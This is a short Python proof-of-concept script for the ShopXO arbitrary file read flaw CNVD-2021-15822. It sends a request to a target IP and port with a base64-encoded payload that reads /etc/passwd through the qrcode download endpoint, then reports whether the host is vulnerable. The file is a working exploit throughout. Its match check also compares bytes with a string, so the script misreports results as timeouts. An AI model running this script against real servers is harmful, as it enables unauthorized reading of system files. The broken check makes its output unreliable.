#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="                                                      #填写payload
    try:
        tar = "http://" + ip + ":" + port
        req = requests.get(tar + payload,timeout=3,verify=False,allow_redirects=False)
    
        if ( b"root" in req.text ):          #填写匹配信息
            logging.info(u"[+] {} find ShopXO_download_Arbitrary_file_read_CNVD_2021_15822".format(ip))                                 #填写漏洞信息
            os._exit(1)

        else :
            logging.info(u"[-] {} do not found ShopXO_download_Arbitrary_file_read_CNVD_2021_15822".format(ip))                         #填写漏洞信息
            os._exit(2)

    except Exception as e:
        logging.info("[*] timeout")
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
